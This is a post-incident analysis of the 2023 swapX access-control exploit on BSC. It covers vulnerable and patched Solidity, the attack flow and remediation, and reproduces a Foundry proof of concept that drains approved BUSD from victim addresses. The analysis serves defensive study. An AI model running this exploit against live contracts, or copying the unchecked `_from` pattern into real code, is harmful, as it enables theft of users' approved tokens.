# swapX — Access Control Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-02-27 |
| **Protocol** | swapX |
| **Chain** | BSC |
| **Loss** | ~$1,000,000 |
| **Attacker EOA** | [0x7d19...aA1F](https://bscscan.com/address/0x7d192FA3a48C307100C3E663050291Fff786aA1F) |
| **Attack Contract** | [0xc4be...7bBF](https://bscscan.com/address/0xc4beA60F5644B20eBb4576E34d84854f9588A7E2) |
| **Attack Tx** | [0x3ee2...0160](https://bscscan.com/tx/0x3ee23c1585474eaa4f976313cafbc09461abb781d263547c8397788c68a00160) |
| **Vulnerable Contract** | [0x6D89...a01](https://bscscan.com/address/0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01) |
| **Root Cause** | Missing `_from` parameter validation in swap function — allows token transfer from arbitrary addresses |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/SwapX_exp.sol) |

---

## 1. Vulnerability Overview

swapX is a decentralized exchange (DEX) protocol operating on the BSC chain. The protocol's core swap function (`selector: 0x4f1f05bc`) was designed to accept the `_from` address — from which tokens are withdrawn during a swap — as an external parameter.

The problem is that **this function does not verify whether `msg.sender` and `_from` are the same**. If a user has previously granted an `approve` on their BUSD tokens to the swapX contract, an attacker can call the function with the victim's address as `_from`, thereby stealing the victim's BUSD.

Victims had already granted BUSD approvals to the swapX contract for normal service usage. The attacker exploited these existing allowances by impersonating the victims and draining their full balances.

This attack required no flash loan — it caused approximately $1M in damage through nothing more than a **missing access control check on a public function**.

---

## 2. Vulnerable Code Analysis

### 2.1 Missing `_from` Parameter Validation in Swap Function (Core Vulnerability)

The swapX contract's swap function (`0x4f1f05bc`) contained logic similar to the following:

```solidity
// ❌ Vulnerable code — _from parameter used without validation
function swap(
    address[] memory path,       // Swap path (BUSD → WBNB → DND)
    uint256 amountIn,            // Input amount
    uint256 amountOutMin,        // Minimum output amount
    uint24[] memory feeOptions,  // Fee configuration array
    address _from                // ❌ Address to withdraw tokens from — no validation!
) external {
    // ❌ No check that msg.sender == _from!
    // Anyone can call this with an arbitrary _from address
    IERC20(path[0]).transferFrom(
        _from,           // ❌ Victim address specified by the attacker
        address(this),
        amountIn
    );
    // ... subsequent swap logic
}
```

**Fixed code (✅ after patch)**:

```solidity
// ✅ Fixed code — use msg.sender directly or require identity verification
function swap(
    address[] memory path,
    uint256 amountIn,
    uint256 amountOutMin,
    uint24[] memory feeOptions,
    address _from
) external {
    // ✅ Caller must be identical to _from
    require(msg.sender == _from, "SwapX: caller is not the from address");
    
    IERC20(path[0]).transferFrom(
        _from,
        address(this),
        amountIn
    );
    // ... subsequent swap logic
}

// Or more simply: remove the _from parameter entirely and use msg.sender
function swap(
    address[] memory path,
    uint256 amountIn,
    uint256 amountOutMin,
    uint24[] memory feeOptions
) external {
    // ✅ Use msg.sender directly — parameter cannot be manipulated
    IERC20(path[0]).transferFrom(
        msg.sender,   // ✅ Always the caller themselves
        address(this),
        amountIn
    );
}
```

**The problem**: The `_from` parameter can be freely specified externally, and since the contract already holds an `approve`, specifying a victim's address causes `transferFrom` to execute successfully. This is an abuse of "delegated withdrawal rights" — every user who has granted an approve to swapX becomes a potential victim.

---

## 3. Attack Flow

### 3.1 Preparation Phase

Victims had previously granted approvals on their BUSD tokens to the swapX contract (`0x6D89...a01`) in order to use the swapX DEX normally. These approvals existed before the attack, and the attacker pre-collected a list of victims by scanning on-chain allowance records.

### 3.2 Execution Phase

1. **[Deploy Attack Contract]** Attacker EOA `0x7d19...aA1F` deploys attack contract `0xc4be...7bBF`
2. **[Build Victim List]** Analyze BSC on-chain events to collect 67+ addresses that granted BUSD approvals to swapX
3. **[Repeatedly Call Swap Function]** Attack contract calls function `0x4f1f05bc` for each victim address specified as `_from`
   - Path: `BUSD → WBNB → DND`
   - Drain victim's full BUSD balance/allowance
   - Receive DND tokens as output
4. **[Convert DND → WBNB]** Swap collected DND to WBNB via PancakeSwap-based Router
5. **[Realize Profit]** Transfer WBNB to attacker wallet

### 3.3 Attack Flow Diagram

```
  [Attacker EOA: 0x7d19...aA1F]
           |
           | deploy
           v
  ┌─────────────────────────┐
  │   Attack Contract       │
  │   0xc4be...7bBF         │
  └────────────┬────────────┘
               │
               │ call(0x4f1f05bc, path, amount, 0, array, victims[i])
               │ _from = victim address (victims[i])
               v
  ┌─────────────────────────┐
  │   swapX Contract        │
  │   0x6D89...a01          │
  │                         │
  │  transferFrom(          │
  │    _from=victim,  ◄─────┼── ❌ Victim address used without validation
  │    this,                │
  │    amount               │
  │  )                      │
  └────────────┬────────────┘
               │  BUSD withdrawn
               │
  ┌────────────▼────────────┐
  │   Victim Wallet         │
  │   (approved BUSD bal.)  │ ──── Full BUSD drained ────▶
  └─────────────────────────┘
               │
               │ BUSD → WBNB → DND swap completed
               v
  ┌─────────────────────────┐
  │   Attack Contract       │
  │   DND received          │
  └────────────┬────────────┘
               │
               │ DND.approve(Router, max)
               │ Router.swapExactTokensForTokens(DND → WBNB)
               v
  ┌─────────────────────────┐
  │   Attack Contract       │
  │   WBNB final receipt    │
  │   (profit realized)     │
  └─────────────────────────┘
               │
               │ WBNB withdrawn
               v
  [Attacker EOA final profit: ~$1,000,000]


  Damage Scale:
  ┌──────────────────────────────────────────────┐
  │  Victims: 16+ (per PoC), 67+                 │
  │  (per actual on-chain tx)                    │
  │  Stolen Token: BUSD                          │
  │  Attack Block: 26,023,089 (BSC)              │
  └──────────────────────────────────────────────┘
```

### 3.4 Outcome

- **Attacker profit**: ~$1,000,000 worth of WBNB
- **Protocol/user loss**: Full BUSD balances of all victims who had granted approvals to swapX

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// swapX BSC Access Control Vulnerability PoC
// Attack Tx: https://bscscan.com/tx/0x3ee23c1585474eaa4f976313cafbc09461abb781d263547c8397788c68a00160

contract ContractTest is Test {
    address swapX = 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01;  // Vulnerable contract
    IERC20 DND  = IERC20(0x34EA3F7162E6f6Ed16bD171267eC180fD5c848da); // Received token
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); // Victim token
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c); // Final profit token
    Uni_Router_V2 Router = Uni_Router_V2(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);

    // [Step 1] Fork BSC at block 26,023,088 (block immediately before attack)
    function setUp() public {
        cheats.createSelectFork("bsc", 26_023_088);
    }

    function testExploit() external {
        // [Step 2] Attacker holds a small amount of DND (for swap path setup)
        deal(address(DND), address(this), 1_000_000 * 1e18);

        // [Step 3] Execute repeated attack against 16 victims
        for (uint256 i; i < victims.length; ++i) {
            // Select the smaller of victim's BUSD balance and allowance to swapX
            uint256 transferAmount = BUSD.balanceOf(victims[i]);
            if (BUSD.allowance(victims[i], swapX) < transferAmount) {
                transferAmount = BUSD.allowance(victims[i], swapX);
                if (transferAmount == 0) continue; // Skip if no allowance
            }

            // Set swap path: BUSD → WBNB → DND
            address[] memory swapPath = new address[](3);
            swapPath[0] = address(BUSD);
            swapPath[1] = address(WBNB);
            swapPath[2] = address(DND);

            // Set fee array (array[0]=65536, array[11]=257 — specific pool parameters)
            uint24[] memory array = new uint24[](16);
            array[0] = 65_536;
            array[11] = 257;

            // [Core Attack] Call function 0x4f1f05bc
            // _from = victims[i] → specify victim address to drain their BUSD
            // ❌ swapX does not verify whether msg.sender == victims[i]!
            swapX.call(abi.encodeWithSelector(
                0x4f1f05bc,      // Vulnerable function selector
                swapPath,        // BUSD → WBNB → DND
                transferAmount,  // Victim's full BUSD balance
                0,               // amountOutMin = 0 (no slippage protection)
                array,           // Fee parameters
                victims[i]       // ❌ _from = victim address (no validation)
            ));
        }

        // [Step 4] Convert collected DND to WBNB to realize final profit
        DNDToWBNB();

        emit log_named_decimal_uint(
            "Attacker WBNB balance after attack", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    // DND → WBNB conversion (using PancakeSwap-based Router)
    function DNDToWBNB() internal {
        DND.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(DND);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokens(
            DND.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Missing `_from` parameter validation in swap function | CRITICAL | CWE-284 | `03_access_control.md` - Pattern 1 |
| V-02 | Unlimited allowance harvesting | HIGH | CWE-862 | `03_access_control.md` - Pattern 1 |
| V-03 | amountOutMin = 0 permitted (no slippage protection) | MEDIUM | CWE-20 | `06_frontrunning.md` |

### V-01: Missing `_from` Parameter Validation in Swap Function (CRITICAL)
- **Description**: The `swap()` function accepts the `_from` address as an external parameter and does not validate whether `msg.sender == _from`. As a result, anyone can specify another user's address as `_from` and fully drain the `allowance` that address has granted to the contract.
- **Impact**: Tokens can be arbitrarily stolen from any user who has granted a BUSD approve to swapX. Iterating over dozens of victims in a single transaction results in large-scale losses.
- **Attack Conditions**: (1) Victim has granted an ERC20 approve to the swapX contract; (2) Attacker has pre-collected victim addresses. Executable with no flash loan or special capital.

### V-02: Unlimited Allowance Harvesting (HIGH)
- **Description**: When victims have granted unlimited allowances (e.g., `type(uint256).max`) to swapX, their entire balance becomes a drain target. This illustrates the risks of the "unlimited approval" practice commonly encouraged by DEX interfaces.
- **Impact**: Not only the current balance, but any BUSD deposited in the future is also at risk.
- **Attack Conditions**: Triggered automatically when V-01 is present and the victim has granted an unlimited approval.

### V-03: amountOutMin = 0 Permitted (MEDIUM)
- **Description**: The PoC sets `amountOutMin = 0`, executing swaps with no slippage protection. If the vulnerable function does not enforce this value, it creates additional exposure to MEV bot sandwich attacks.
- **Impact**: Attacker can force swaps at arbitrarily unfavorable prices.
- **Attack Conditions**: Maximized when combined with V-01.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix Method 1: Force use of msg.sender as _from
function swap(
    address[] memory path,
    uint256 amountIn,
    uint256 amountOutMin,
    uint24[] memory feeOptions
    // _from parameter removed entirely
) external {
    // Only msg.sender can withdraw their own tokens
    IERC20(path[0]).transferFrom(msg.sender, address(this), amountIn);
    // ...
}

// ✅ Fix Method 2: Add caller validation when retaining _from parameter
function swap(
    address[] memory path,
    uint256 amountIn,
    uint256 amountOutMin,
    uint24[] memory feeOptions,
    address _from
) external {
    // Caller must match _from
    require(msg.sender == _from, "SwapX: unauthorized from address");
    IERC20(path[0]).transferFrom(_from, address(this), amountIn);
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Missing `_from` validation | Remove `_from` parameter and use `msg.sender` directly, or add `require(msg.sender == _from)` |
| V-02: Unlimited allowance | Guide users through the UI to approve only exact amounts; set allowance caps at the contract level |
| V-03: Unprotected slippage | Enforce `amountOutMin > 0` or add minimum output validation logic |
| General access control | Audit all `external`/`public` functions for `msg.sender`-based authorization checks |
| Approval pattern | Improve frontend to approve only per-transaction exact amounts instead of unlimited `type(uint256).max` approvals |

---

## 7. Lessons Learned

1. **Functions that accept a `_from` parameter must always verify `msg.sender == _from`.** A function that internally calls `transferFrom` while accepting the `_from` address externally enables full drainage of any granted allowance. The safest alternative is to remove the `_from` parameter entirely and use `msg.sender` directly.

2. **A user's approve is the most powerful permission they can grant a protocol.** The moment a user grants an approve to a contract, every function in that contract becomes a potential withdrawal path for the approved tokens. Accordingly, every function that leverages approvals requires rigorous access control review.

3. **"Unlimited approve" infinitely expands the attack surface.** For DEX usability, users commonly grant `type(uint256).max` approvals. In this case, a single vulnerable function exposes both current and future balances to risk. Frontends should encourage per-transaction approvals, or contracts should automatically exhaust the allowance after use.

4. **On a high-traffic contract like a DEX, the list of addresses holding approvals is public information.** Due to blockchain transparency, anyone can query the list of addresses that have granted approvals to a given contract. The moment a vulnerability exists, the victim list already exists alongside it.

5. **Attacks without flash loans can be more devastating.** This attack drained $1M through a simple function call alone. A straightforward access control mistake can produce more catastrophic outcomes than complex attack vectors.

6. **External audits and establishing a trust model for all external parameters before deployment are essential.** Auditors must examine every address parameter received from outside with the question: "What if this address is specified maliciously?"

---

## 8. On-Chain Verification

### 8.1 Attack Tx Basic Information

| Field | Value |
|------|-----|
| **Block Number** | 26,023,089 |
| **Attacker EOA** | `0x7d192FA3a48C307100C3E663050291Fff786aA1F` |
| **Attack Contract** | `0xc4beA60F5644B20eBb4576E34d84854f9588A7E2` |
| **Target Contract** | `0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01` |
| **Gas Used** | ~13,566,381 gas (reflecting large loop) |

### 8.2 Transaction Structure Notes

Analyzing the on-chain transaction input data confirms that **the actual attack involved 67 or more victims** — unlike the PoC. The transaction calldata encodes an array of 67+ addresses, and the 16 victims in the PoC represent only a publicly reproduced subset.

The actual attack contract (`0xc4be...7bBF`) received the full victim address array via calldata and processed all victims in a single transaction by repeatedly calling the swapX function.

### 8.3 Reference Links

- BlockSec analysis: https://twitter.com/BlockSecTeam/status/1630111965942018049
- PeckShield analysis: https://twitter.com/peckshield/status/1630100506319413250
- CertiK alert: https://twitter.com/CertiKAlert/status/1630241903839985666